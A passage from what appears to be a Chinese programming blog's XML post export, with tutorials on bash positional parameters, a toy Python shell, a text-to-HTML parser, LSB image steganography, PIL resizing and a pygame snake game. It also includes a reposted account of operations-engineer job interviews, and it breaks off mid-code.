是第二个参数，$3 是第三个参数，然后是第四个。$9 之后的位置参数就必须用大括号括起来了，比如，${10}，${11}，${12}。 $# ： 传递到脚本的参数个数$ ： 以一个单字符串显示所有向脚本传递的参数。与位置变量不同,此选项参数可超过 9个$$ ： 脚本运行的当前进程 ID号$! ： 后台运行的最后一个进程的进程 ID号$@ ： 与$相同,但是使用时加引号,并在引号中返回每个参数$： 显示shell使用的当前选项,与 set命令功能相同$? ： 显示最后命令的退出状态。 0表示没有错误,其他任何值表明有错误。4.位置参数实例这个十分重要，在我们运行一套脚本的时候，有时候是需要参数的，这里我们教大家如何获取参数 $ vim test30.sh输入代码（中文皆为注释，不用输入）：123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# 作为用例, 调用这个脚本至少需要10个参数, 比如:# bash test.sh 1 2 3 4 5 6 7 8 9 10MINPARAMS=10echoecho "The name of this script is \"$0\"."echo "The name of this script is \"`basename $0`\"."echoif [ -n "$1" ] # 测试变量被引用.thenecho "Parameter #1 is $1" # 需要引用才能够转义"#"fi if [ -n "$2" ]thenecho "Parameter #2 is $2"fi if [ -n "$&#123;10&#125;" ] # 大于$9的参数必须用&#123;&#125;括起来.thenecho "Parameter #10 is $&#123;10&#125;"fi echo "-----------------------------------"echo "All the command-line parameters are: "$*""if [ $# -lt "$MINPARAMS" ]then echo echo "This script needs at least $MINPARAMS command-line arguments!"fi echoexit 0]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Simple shell implementation based on Python]]></title>
    <url>%2F2018%2F10%2F21%2FSimple-shell-implementation-based-on-Python%2F</url>
    <content type="text"><![CDATA[文件结构：|—-shell.py|| |—-cd.py| |—-constants.py|—-|—-exit.py |—-getenv.py |—-history.py |—-init.py shell.py:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8import osimport sysimport shleximport getpassimport socketimport signalimport subprocessimport platformfrom func import *built_in_cmds = &#123;&#125;def tokenize(string): return shlex.split(string) def preprocess(tokens): processed_token = [] for token in tokens: if token.startswith('$'): processed_token.append(os.getenv(token[1:])) else: processed_token.append(token) return processed_tokendef handler_kill(signum, frame): raise OSError("Killed!")def execute(cmd_tokens): with open(HISTORY_PATH, 'a') as history_file: history_file.write(' '.join(cmd_tokens) + os.linesep) if cmd_tokens: cmd_name = cmd_tokens[0] cmd_args = cmd_tokens[1:] if cmd_name in built_in_cmds: return built_in_cmds[cmd_name](cmd_args) signal.signal(signal.SIGINT, handler_kill) if platform.system() != "Windows": p = subprocess.Popen(cmd_tokens) p.communicate() else: command = "" command = ' '.join(cmd_tokens) os.system(command) return SHELL_STATUS_RUNdef display_cmd_prompt(): user = getpass.getuser() hostname = socket.gethostname() cwd = os.getcwd() base_dir = os.path.basename(cwd) home_dir = os.path.expanduser('~') if cwd == home_dir: base_dir = '~' if platform.system() != 'Windows': sys.stdout.write("[\033[1;33m%s\033[0;0m@%s \033[1;36m%s\033[0;0m] $ " % (user, hostname, base_dir)) else: sys.stdout.write("[%s@%s %s]$ " % (user, hostname, base_dir)) sys.stdout.flush()def ignore_signals(): if platform.system() != "Windows": signal.signal(signal.SIGTSTP, signal.SIG_IGN) signal.signal(signal.SIGINT, signal.SIG_IGN)def shell_loop(): status = SHELL_STATUS_RUN while status == SHELL_STATUS_RUN: display_cmd_prompt() ignore_signals() try: cmd = sys.stdin.readline() cmd_tokens = tokenize(cmd) cmd_tokens = preprocess(cmd_tokens) status = execute(cmd_tokens) except: _, err, _ = sys.exc_info() print(err)def register_command(name, func): built_in_cmds[name] = funcdef init(): register_command("cd", cd) register_command("exit", exit) register_command("getenv", getenv) register_command("history", history)def main(): init() shell_loop()if __name__ == "__main__": main() cd.py123456789#coding:utf-8from .constants import *def cd(args): if len(args) &gt; 0: os.chdir(args[0]) else: os.chdir(os.getenv('HOME')) return SHELL_STATUS_RUN constants.py12345678#coding:utf-8import osSHELL_STATUS_STOP = 0SHELL_STATUS_RUN = 1# 使用 os.path.expanduser('~') 获取当前操作系统平台的当前用户根目录HISTORY_PATH = os.path.expanduser('~') + os.sep + '.shiyanlou_shell_history' exit.py12345#coding:utf-8from .constants import *def exit(args): return SHELL_STATUS_STOP getenv.py1234567#coding:utf-8from .constants import *def getenv(args): if len(args) &gt; 0: print(os.getenv(args[0])) return SHELL_STATUS_RUN history.py12345678910111213141516#coding:utf-8import sysfrom .constants import *def history(args): with open(HISTORY_PATH, 'r') as history_file: lines = history_file.readlines() limit = len(lines) if len(args) &gt; 0: limit = int(args[0]) start = len(lines) - limit for line_num, line in enumerate(lines): if line_num &gt;= start: sys.stdout.write('%d %s' % (line_num + 1, line)) sys.stdout.flush() return SHELL_STATUS_RUN init.py12345from .cd import cdfrom .exit import exitfrom .getenv import getenvfrom .history import historyfrom .constants import * 运行结果：]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[the difference between people]]></title>
    <url>%2F2018%2F10%2F16%2Fthe-difference-of-people%2F</url>
    <content type="text"><![CDATA[作者：非衣链接：https://www.nowcoder.com/discuss/18612来源：牛客网 题外话秋招已经结束了，想了想还是准备把自己的面试历程写一下。也算是对大学四年的一个交代。 自己应该算是一个小白吧，就读于西安科技大学，环境工程专业。非985，非211。学校和西安电子科技大学就差两个字，但差的很远，坐落在骊山脚下。本身算是对计算机感兴趣，但还是比较弱。没有名企实习经历，也没有厉害的项目经验，连专业也与计算机不相关。很想去BAT，网易，网易游戏…，与网易游戏的三面之缘；阿里的20多轮面试，五个已回绝；腾讯春招那两个宽容和蔼的面试官；与百度之间的遗憾；还有实验楼面试官的理解… ,很多都是在校招路上的经验。实习真的很重要，尤其时名企实习，可以很大程度上帮助你通过面试。 面试时实力与运气的结合，当然你实力越强，那么所需要的运气就可以渐渐忽略。自己的学习之路，从C/C 到java，再到python以及现在的运维研发。坚持自己的梦想，走下去，总会看到希望。 校招之路实习实习到最后自己拿到了百度/豌豆荚的offer，但由于个人原因，最后没去实习。 历程（主要是运维）腾讯内推 omg（一面–&gt; hr挂） 腾讯春招 teg （一面–&gt; 二面挂） 百度内推 （一面–&gt; 二面挂 ） 百度春招 （offer） 饿了么 （二面挂） 网易游戏雷火盘古 （二面挂） 豌豆荚 （offer） 阿里（面了好多面，几个职位都挂了） 网易笔试过了，没有面试 面试中的问题实习生面试基本很看重基础，对基础考察很细，在运维这一块，主要考察网络和linux基础。 网络 tcp/ip 三次握手/四次挥手过程（腾讯/百度/豌豆荚） tcp连接中各个状态的含义（重点在time_wait）（百度/阿里） 第三次握手失败，或者某一个状态错误 （引出计时器，以及重传，SYN攻击）（网易游戏） 回退N帧协议（阿里/百度） 拥塞避免/慢启动/快重传/快速恢复（所有公司都有问） tcp与udp的区别 格式 HTTP协议 状态码 长连接与短连接的区别（LVS是通过长连接作负载均衡）（百度/阿里/豌豆荚） 格式 DNS 记录dns的解析（递归和迭代）什么时候用udp/tcp路由 路由与交换机的区别 路由协议（RIP/OPSF） 其它的一些 vlan/vxlan（网易游戏）linux 基本命令 有关进程（ps/top） 网络 （netstat/ss/ping/traceroute/tcpdump） 一般会在问完网络时，开始问相关的命令 内存（free 会问到buff/cache） 文件处理（grep/sed/awk）很重要，面试必问 一些日常脚本 iptables 文件系统（ext4） 超级块 cp/mv的区别（按我的理解答了下，但阿里面试官问的实现，没答好） 软硬连接（inode这块，ln / ln -s） 内核调优（一些常用参数的优化，一般是tcp这块的，会在time_wait和syn攻击这块问，还有就是apache那块，百度面试官问select这块，提过） 开机启动过程 一些运维相关的知识 操作系统 进程vs线程（每次面试必问） 段页（百度提了一下，答的很差） IO模型介绍以及同步异步阻塞非阻塞的区别（nginx与apache比较时，通常会问到）select/poll/epoll python 闭包 / 装饰器（网易游戏/阿里/百度） 迭代器 / 生成器 （腾讯/网易游戏/百度） 多线程 thread/threading （要么继承线程类，重写run方法；要么就把函数当参数传入） 内存管理（强烈推荐看《垃圾回收的算法与实现》） 引用计数垃圾回收引用计数标记-清除分代收集mysql 基本sql语句 主从复制（架构/错误恢复/MHA） mysql存储引擎 备份（热备/冷备） 运维相关 LVS四种模式（阿里特别喜欢问，腾讯也问过） 负载均衡（DNS/nginx/LVS/vipserver） 高可用集群（heardbead/keepalived ） heardbead与keepalived的区别，脑裂问题的解决，高可用方案的优劣 案例分析 面试腾讯内推 一面问了linux基础，top/ps一些命令，以及一些常用的监控软件的使用比较。当然，必问的lvs，实现以及原理。tcp三次握手/四次挥手。还问了自己的爱好，和学习历程。之后就是一个月的等待，一天下午，hr打来电话，hr面表现不好，挂了。 正式校招 一面：当时超级紧张，连话都说不出来，还好面试官很nice，主动问我简历上的问题，对我做的一些小程序很感兴趣。之后等我缓解之后，再让我自我介绍 二面：二面面试官让人觉得也很亲切，问了很多家庭方面的问题。虽然最后还是挂了，但还是很感谢面试官。 百度百度内推和正式校招问的问题差不多都一样。 RAID 的各个级别及区别python 中 list 和 tuple 的区别 list 是可变的，tuple 是不可变的，可变与可变说的是内存地址是否可变。tcp 的慢启动 为了进行流量控制，TCP 在发送方维护一个变量”接收窗口”,发送端的发送窗口上限值应取“接收方窗口”和“拥塞窗口”中较小的一个，前者是来自接收方的流量控制，后者是来自发送方的流量控制。为了更好的在运输层进行拥塞控制，因特网定义了 4 种算法，即慢启动，拥塞避免，快重传，快恢复。 慢启动阶段，拥塞窗口从 0 开始以指数方式快速增加，直到达到拥塞窗口的门限值，然后开始执行拥塞避免，即拥塞窗口以线性速度增加。tcp 状态 time_wait 的作用 TIME_WAIT 是为了实现 TCP 全双工连接的可靠性关闭，用来重发可能丢失的 ACK 报文；需要持续2个MSL(最大报文生存时间)：假设应用程序端口在进入TIME_WAIT后，2个 MSL时间内并没有收到FIN,说明应用程序最后发出的ACK已经收到了；否则，会在2个MSL内再次收到ACK.回退N帧协议/滑动窗口python的内存管理，我博客做了很详细的解释，我的博客阿里实习时自己内推了系统工程师，本来是简历都没过，大神华哥帮我复活，面了7面，我都不知道面了些什么。 秋招历程阿里内推挂 阿里校招java开发 网易内推 运维工程师 （一面-&gt;二面-&gt;总监面-&gt;hr挂） 腾讯（内推没理我，校招一面挂） 美团（一面-&gt;二面-&gt;三面-&gt;hr挂） 百度（因为美团面试耽误太多时间，错过了面试，但最后又去面试，面试官给了个机会，三面挂 ） 搜狗（美团面试中，没有去面试，很遗憾） 微店提前批 运维研发 蘑菇街 （简历筛选未过） 网易游戏互动娱乐（第一次面试止步二面） 新浪社招/新浪微博 网易北京 运维研发（offer，归属） 还有其它的4399，完美世界之类 笔试笔试网站目前就几家吧:牛客网,赛码网,ceping,amact,前面2个网站编程题可以跳出,后面几个都不能. 百度:一般用的是赛码网和amact，编程题都不能跳出 阿里巴巴:用的是自己研发的笔试网站,一般是20个选择题(数学题和智力题居多),3道附加题(很难)，反正就是写一大堆。 腾讯:一直都用的是ceping网,30道选择题,然后几道论述题,一般都是架构. 网易：牛客网，内推时出了小问题，不过还好，依然过了笔试，校招选择了网易放弃了小米。 网易游戏：互动娱乐出的最正宗的运维笔试题，很给力，题量大。 微软中国：还是很难，同样编程。 华为:机试好像是3道编程题. google，google是有自己的测评，题还是很难。面试英文，压力大。 其余的公司:线上或者线下笔试（笔试题中C/C 偏多） 面试说几个自己觉得重要的吧 阿里内推 阿里是一个很看重基础的公司，要求很多，面试官很nice，也是自己从大二开始就去面试的一家公司，之前实习也去面过，校招面的cdn部门，各种网络问题，以及有关cdn的问题。 一面是在自己参加完网易北京内推面试回北京的路上，自己找了个角落，面了20分钟，然后说二面会有后续通知，没有然后了。 校招 一面： 面试官很严厉，全程不怎么说话，我就一直写代码。从最简单的链表逆置到二叉树，字符串匹配算法。还有就是问了python，java的内存管理，新生代什么，画图给面试官看了，jvm的一些（提前看了面经，表现的会好一点）。到了最后，面试官才表现笑容，让我等后续通知。 二面： 二面面试官很和蔼，问了下自己写的项目，基于python的日志分析工具，问了下hadoop的相关知识，HDFS，mapreduce的一些。作业提交（基于java API，streaming，pipes），画了下hadoop的架构，最后表示自己对运维比较熟悉，对开发这块比较弱。然后面试官问了下linux相关的问题。 三面：问了项目相关的问题，以及linux，还有c/c 的一些问题，还有就是算法，面试官笑问我，不是擅长python，为什么写算法题用c,当时回答了自己感觉好把握，好表示。 hr面：查户口 过了两周给了口头offer，没有然后了。 网易内推 网易内推人好少，去北京面试的只有几个，当时去的时候，遇到一个特别好的hr。然后给我安排面试。 一面： python多线程（threading/thread），lvs四种工作模式，然后各种问，nat模式怎么实现，dr模式怎么禁止arp，禁用arp后，负载均衡器怎么找到后端真实服务器mac，如果中间有路由，有交换机，怎么找（真实服务器禁用的是lo的arp响应，vip也是绑定在lo上，但有真实服务器的ip）; python调用shell命令,之间方法有什么不同，其实就是返回值。ssh的原理。对虚拟化的了解，kvm/xen。iptables规则的书写；自己的运维平台项目的相关问题，统计nginx日志出现次数最多的ip，awk搞定，最后又作死说了hadoop的nginx日志分析，面试官让我介绍下hadoop，差点挂了。 二面： 写二分查找，快速排序，给面试官讲常见的排序思想，画图；python的内存管理，和C/C 有什么不同，python有回收机制，C/C 手动回收（malloc/free new/delete）。问用过什么自动化运维工具，puppet/ansible/saltstack…;又问有什么区别，答的很差，就是答了c/s架构，ssh和消息队列。等侯三面。 中间hr给了个饭票，去网易吃了个饭。 三面：以为三面就是hr面，结果加了一面。继续技术面，问了docker，openstack，日志处理ELK的原理机制。之后就是问家庭情况，愿不愿意来北京，平时喜欢看什么书。 hr面： 家庭情况，工作地点要求，想成为什么样的人，学习计划，薪资要求（要了8000） 之后等通知，G20过后，等来拒信。 校招 校招时自己投了运维研发岗，放弃小米笔试，搞了网易北京的运维研发笔试题。之后通知去面试，但网易游戏的机票也在那一天，就和hr沟通过后，第二天去面试。早上面完网易游戏，中午赶紧去网易面试。赶到网易时，2点，签到之后等待，等到下午快5点时，终于可以让我面试了。 一面： 面试官是我二面面试官，没有自我介绍，问linux命令，问网络；回答nginx的惊群问题，（多线程/多进程（Linux下线程进程也没多大区别）等待同一个socket事件，当这个事件发生时，这些线程/进程被同时唤醒，就是惊群。许多进程被内核重新调度唤醒，同时去响应这一个事件，当然只有一个进程能处理事件成功，其他的进程在处理该事件失败后重新休眠。这种性能浪费现象就是惊群。）；如何解惊群问题；回答（锁，红黑树，定时器） 二面：面试官还是熟人，依然问项目，自动化运维的实现，自己平台的优势和缺点，设计思想。ansible/saltstack的比较；从各个运维工具的设计思想组件，给讲了；然后就让我问问题，我就说我还要学习什么，还有什么缺点。面试官说我在运维这一块很优秀，担心我基础（非专业）；然后我就说自己学了什么东西，讲了自己学习的东西。说了一个小时多吧，面试官联系了hr，给我安排最后一轮面试。等到7点多，hr通知我去面试。 hr面：压力面，很严肃，问了很多问题，对我很质疑，最后对我说，前面两轮面试官对我评价很好，她要考虑下，下周给答复。 走出网易大厦时，差不多是8点了，回到住的地方10点多，吃了点饭，睡觉。第二天，回西安。 周一上课时，9点左右，手机震动，心中有预感，赶紧出教室，网易hr打的电话。网易游戏一面： 电话面，两个面试官，很nice。上来就问tcp，把tcp问了个遍，还问了linux内核3.0以后，对tcp协议支持（到现在还不会）,vlan/vxlan，之后就是内核参数，进程vs线程，文件系统，项目，我的github,博客。自己以为挂了，之后十一前打电话，通知去北京面试，本来想拒绝，但包机票，就答应了。 二面：现场面，项目，自动化运维工具的比较（答的很差，然后面试官说了要从设计思路，组件方面回答，下午网易面试用上了）。在我接受了网易offer后，把三方邮过去后，网易游戏再次约我面试。 美团选择了美团，错过了百度和搜狗；但美团依旧拒绝了我。 一面： 11点40多面试，就问了两个算法。 二面： 网络，mysql的事务，智力题 三面： 项目，linux基础考察 hr：阿里月饼 学习历程个人学习接触计算机方面知识是在大一，当时只是为了考个二级，莫名其妙的入坑。从大一学习c语言吧，当时看的是谭浩强的书，勉强入门吧，之后也就看了《c与指针》之类的书。大一暑假开始学C ,看了一些C 方面的书，《C primer》，《编程思想》，《c 沉思录》，还有对我很有影响的《STL源码剖析》。那时候，对阿里有种向往，想进阿里，然后开始学java，也看了很多书，《java编程思想》，《java web开发-王者归来》之类的。然后大二开始投了阿里和腾讯。腾讯连笔试都没过，阿里就面了个java，到二面挂了，当时颇受打击。当时笔试题有好多linux的，然后大二暑假就开始学linux，一开始看完了《鸟哥的linux私房菜》，之后又是各种linux书籍，学shell，看数据库，看架构。选择运维是个意外，但也是一种逃避吧。大三一年就在linux中挣扎，很痛苦。linux学习中发现运维的面很广，自己就选了devops，看了很多，也学习了很多。书籍推荐linux鸟哥私房菜 《 Linux 内核设计与实现》 《Linux从入门到精通(第2版)》 linux就是这个范儿 《Linux与Unix Shell 编程指南》 《unix环境高级编程第二版》《unix操作系统设计与实现》 官方文档 网络TCP协议族 TCP详解（1，2，3） 操作系统现代操作系统 深入理解计算机操作系统 操作系统概念 大数据hadoop核心技术 Hadoop权威指南 《Hadoop技术内幕-深入解析MapReduce架构设计与实现原理》和《Hadoop技术内幕-深入解析Hadoop Common和HDFS架构设计与实现原理》 自动化运维python自动化运维 saltstack技术入门与实战 ansible自动化运维 大公司很看重基础，多看看操作系统，网络。 未完待续 看过之后感觉自己真的很弱，要努力的地方还有很多……]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python text parser]]></title>
    <url>%2F2018%2F10%2F16%2FPython-text-parser%2F</url>
    <content type="text"><![CDATA[util.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/python# encoding: utf-8class Rule: """ 规则父类 """ def action(self, block, handler): """ 加标记 """ handler.start(self.type) handler.feed(block) handler.end(self.type) return Trueclass HeadingRule(Rule): """ 一号标题规则 """ type = 'heading' def condition(self, block): """ 判断文本块是否符合规则 """ return not '\n' in block and len(block) &lt;= 70 and not block[-1] == ':'class TitleRule(HeadingRule): """ 二号标题规则 """ type = 'title' first = True def condition(self, block): if not self.first: return False self.first = False return HeadingRule.condition(self, block);class ListItemRule(Rule): """ 列表项规则 """ type = 'listitem' def condition(self, block): return block[0] == '-' def action(self, block, handler): handler.start(self.type) handler.feed(block[1:].strip()) handler.end(self.type) return Trueclass ListRule(ListItemRule): """ 列表规则 """ type = 'list' inside = False def condition(self, block): return True def action(self, block, handler): if not self.inside and ListItemRule.condition(self, block): handler.start(self.type) self.inside = True elif self.inside and not ListItemRule.condition(self, block): handler.end(self.type) self.inside = False return Falseclass ParagraphRule(Rule): """ 段落规则 """ type = 'paragraph' def condition(self, block): return True headlers.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/python# encoding: utf-8class Handler: """ 处理程序父类 """ def callback(self, prefix, name, *args): method = getattr(self, prefix + name, None) if callable(method): return method(*args) def start(self, name): self.callback('start_', name) def end(self, name): self.callback('end_', name) def sub(self, name): def substitution(match): result = self.callback('sub_', name, match) if result is None: result = match.group(0) return result return substitutionclass HTMLRenderer(Handler): """ HTML处理程序,给文本块加相应的HTML标记 """ def start_document(self): print('&lt;html&gt;&lt;head&gt;&lt;title&gt;ShiYanLou&lt;/title&gt;&lt;/head&gt;&lt;body&gt;') def end_document(self): print('&lt;/body&gt;&lt;/html&gt;') def start_paragraph(self): print('&lt;p style="color: #444;"&gt;') def end_paragraph(self): print('&lt;/p&gt;') def start_heading(self): print('&lt;h2 style="color: #68BE5D;"&gt;') def end_heading(self): print('&lt;/h2&gt;') def start_list(self): print('&lt;ul style="color: #363736;"&gt;') def end_list(self): print('&lt;/ul&gt;') def start_listitem(self): print('&lt;li&gt;') def end_listitem(self): print('&lt;/li&gt;') def start_title(self): print('&lt;h1 style="color: #1ABC9C;"&gt;') def end_title(self): print('&lt;/h1&gt;') def sub_emphasis(self, match): return('&lt;em&gt;%s&lt;/em&gt;' % match.group(1)) def sub_url(self, match): return('&lt;a target="_blank" style="text-decoration: none;color: #BC1A4B;" href="%s"&gt;%s&lt;/a&gt;' % (match.group(1), match.group(1))) def sub_mail(self, match): return('&lt;a style="text-decoration: none;color: #BC1A4B;" href="mailto:%s"&gt;%s&lt;/a&gt;' % (match.group(1), match.group(1))) def feed(self, data): print(data) rules.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/python# encoding: utf-8class Rule: """ 规则父类 """ def action(self, block, handler): """ 加标记 """ handler.start(self.type) handler.feed(block) handler.end(self.type) return Trueclass HeadingRule(Rule): """ 一号标题规则 """ type = 'heading' def condition(self, block): """ 判断文本块是否符合规则 """ return not '\n' in block and len(block) &lt;= 70 and not block[-1] == ':'class TitleRule(HeadingRule): """ 二号标题规则 """ type = 'title' first = True def condition(self, block): if not self.first: return False self.first = False return HeadingRule.condition(self, block);class ListItemRule(Rule): """ 列表项规则 """ type = 'listitem' def condition(self, block): return block[0] == '-' def action(self, block, handler): handler.start(self.type) handler.feed(block[1:].strip()) handler.end(self.type) return Trueclass ListRule(ListItemRule): """ 列表规则 """ type = 'list' inside = False def condition(self, block): return True def action(self, block, handler): if not self.inside and ListItemRule.condition(self, block): handler.start(self.type) self.inside = True elif self.inside and not ListItemRule.condition(self, block): handler.end(self.type) self.inside = False return Falseclass ParagraphRule(Rule): """ 段落规则 """ type = 'paragraph' def condition(self, block): return True markup.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/python# encoding: utf-8import sys, refrom handlers import *from util import *from rules import *class Parser: """ 解析器父类 """ def __init__(self, handler): self.handler = handler self.rules = [] self.filters = [] def addRule(self, rule): """ 添加规则 """ self.rules.append(rule) def addFilter(self, pattern, name): """ 添加过滤器 """ def filter(block, handler): return re.sub(pattern, handler.sub(name), block) self.filters.append(filter) def parse(self, file): """ 解析 """ self.handler.start('document') for block in blocks(file): for filter in self.filters: block = filter(block, self.handler) for rule in self.rules: if rule.condition(block): last = rule.action(block, self.handler) if last: break self.handler.end('document')class BasicTextParser(Parser): """ 纯文本解析器 """ def __init__(self, handler): Parser.__init__(self, handler) self.addRule(ListRule()) self.addRule(ListItemRule()) self.addRule(TitleRule()) self.addRule(HeadingRule()) self.addRule(ParagraphRule()) self.addFilter(r'\*(.+?)\*', 'emphasis') self.addFilter(r'(http://[\.a-zA-Z/]+)', 'url') self.addFilter(r'([\.a-zA-Z]+@[\.a-zA-Z]+[a-zA-Z]+)', 'mail')"""运行程序"""handler = HTMLRenderer()parser = BasicTextParser(handler)parser.parse(sys.stdin)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Turing machine and Turing test]]></title>
    <url>%2F2018%2F10%2F11%2FTuring-machine-and-Turing-test%2F</url>
    <content type="text"><![CDATA[自己小的时候就喜欢思考生与死这样的问题，有时候还会幻想自己能不能长生不死，现在想想那时候能够这样想是多么的幸福，而现在有这样的想法是多么的奢侈…… 图灵测试： 如果一个人（代号C）使用测试对象皆理解的语言去询问两个他不能看见的对象任意一串问题。对象为：一个是正常思维的人（代号B）、一个是机器（代号A）。如果经过若干询问以后，C不能得出实质的区别来分辨A与B的不同，则此机器A通过图灵测试。]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 image steganography]]></title>
    <url>%2F2018%2F10%2F11%2FPython3-image-steganography%2F</url>
    <content type="text"><![CDATA[大致分析了一下，还有很多地方没有弄明白。 code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from PIL import Image"""取得一个 PIL 图像并且更改所有值为偶数（使最低有效位为 0）"""def makeImageEven(image): pixels = list(image.getdata()) # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...] evenPixels = [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1,t&gt;&gt;1&lt;&lt;1) for [r,g,b,t] in pixels] # 更改所有值为偶数（魔法般的移位） evenImage = Image.new(image.mode, image.size) # 创建一个相同大小的图片副本 evenImage.putdata(evenPixels) # 把上面的像素放入到图片副本 return evenImage"""内置函数 bin() 的替代，返回固定长度的二进制字符串"""def constLenBin(int): binary = "0"*(8-(len(bin(int))-2))+bin(int).replace('0b','') # 去掉 bin() 返回的二进制字符串中的 '0b'，并在左边补足 '0' 直到字符串长度为 8 return binary"""将字符串编码到图片中"""def encodeDataInImage(image, data): evenImage = makeImageEven(image) # 获得最低有效位为 0 的图片副本 binary = ''.join(map(constLenBin,bytearray(data, 'utf-8'))) # 将需要被隐藏的字符串转换成二进制字符串 if len(binary) &gt; len(image.getdata()) * 4: # 如果不可能编码全部数据， 抛出异常 raise Exception("Error: Can't encode more than " + len(evenImage.getdata()) * 4 + " bits in this image. ") encodedPixels = [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 &lt; len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里 encodedImage = Image.new(evenImage.mode, evenImage.size) # 创建新图片以存放编码后的像素 encodedImage.putdata(encodedPixels) # 添加编码后的数据 return encodedImage"""从二进制字符串转为 UTF-8 字符串"""def binaryToString(binary): index = 0 string = [] rec = lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else '') if x else '' # rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or '')) or '' fun = lambda x, i: x[i+1:8] + rec(x[8:], i-1) while index + 1 &lt; len(binary): chartype = binary[index:].index('0') # 存放字符所占字节数，一个字节的字符会存为 0 length = chartype*8 if chartype else 8 string.append(chr(int(fun(binary[index:index+length],chartype),2))) index += length return ''.join(string)"""解码隐藏数据"""def decodeImage(image): pixels = list(image.getdata()) # 获得像素列表 binary = ''.join([str(int(r&gt;&gt;1&lt;&lt;1!=r))+str(int(g&gt;&gt;1&lt;&lt;1!=g))+str(int(b&gt;&gt;1&lt;&lt;1!=b))+str(int(t&gt;&gt;1&lt;&lt;1!=t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据 # 找到数据截止处的索引 locationDoubleNull = binary.find('0000000000000000') endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull data = binaryToString(binary[0:endIndex]) return dataencodeDataInImage(Image.open("coffee.png"), '你好世界，Hello world!').save('encodeImage.png')print(decodeImage(Image.open("encodeImage.png"))) note: 最低有效位（英语：Least Significant Bit，lsb）是指一个二进制数字中的第0位（即最低位），权值为2^0，可以用它来检测数的奇偶性。与之相反的称之为最高有效位。在大端序中，lsb指最右边的位。最低有效位代表二进制数中的最小的单位，可以用来指示数字很小的变化。LSB（全大写）有时也指Least Significant Byte，指多字节序列中最小权重的字节。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PIL change image]]></title>
    <url>%2F2018%2F10%2F10%2FPIL-resize-image%2F</url>
    <content type="text"><![CDATA[运用PIL改变图片的大小之前一直使用从别人网站上盗取的图片（如果内容涉及到侵权的话请联系我，我会把他们删除的^_^）,今天自己找了个图片，因为图片大小不一致，放到blog上面太不美观了。想到前几天学的pillow库，灵机一动在网上找了个关于使用python修改图片大小的教程，自己又改了些部分的内容，做了一个改变图片大小的小程序。实现了一下效果还不错。这里面有个坑就是y_x的类型必须是int类型的，不然的话运行的时候一直报错。 adjust.py1234567891011121314151617181920212223242526272829303132333435from PIL import Imageimport argparse"""Usage python3 adjust.py [infile]Options: -h --help show this on screen."""parser = argparse.ArgumentParser()parser.add_argument("infile")args = parser.parse_args()infile = args.infileoutfile = "resize_"+infileim = Image.open(infile)print(im.size)(x, y) = im.sizeprint(im)x_s = 529y_s = (int)(y * x_s / x)out = im.resize((x_s, y_s), Image.ANTIALIAS)out.save(outfile)print("original size : ", x, y)print("adjust size : ", x_s, y_s) 运行结果：改之前：改之后： 查看图片像素view.py123456789101112131415161718192021222324252627from PIL import Imageimport argparse"""Usage python3 adjust.py [infile]Options: -h --help show this on screen."""parser = argparse.ArgumentParser()parser.add_argument("infile")args = parser.parse_args()infile = args.infileim = Image.open(infile)im = im.convert('RGBA')pixdata = im.load()for x in range(im.size[0]): for y in range(im.size[1]): print(pixdata[x, y])]]></content>
      <categories>
        <category>python</category>
        <category>pillow</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pillow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pygame development snake game]]></title>
    <url>%2F2018%2F10%2F10%2FPygame-development-snake-game%2F</url>
    <content type="text"><![CDATA[今天用python做了一个贪吃蛇的游戏，目前功能还不完善，但是基本的操作都有了。game.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127import pygameimport timeimport randompygame.init()white = (255, 255, 255)black = (0, 0, 0)red = (255, 0, 0)favorite1 = (43, 95, 117)favorite2 = (219, 142, 113)screen_height = 800screen_width = 800rect_size = 30FPS = 30snake_list = []gameDisplay = pygame.display.set_mode((screen_height, screen_width))pygame.display.set_caption('snake game')pygame.display.update()font = pygame.font.SysFont(None, 25)clock = pygame.time.Clock()def message_to_screen(msg, color, x, y): screen_text = font.render(msg, True, color) gameDisplay.blit(screen_text, [x, y])def snake(snake_list): print(len(snake_list)) for XnY in snake_list: pygame.draw.rect(gameDisplay, 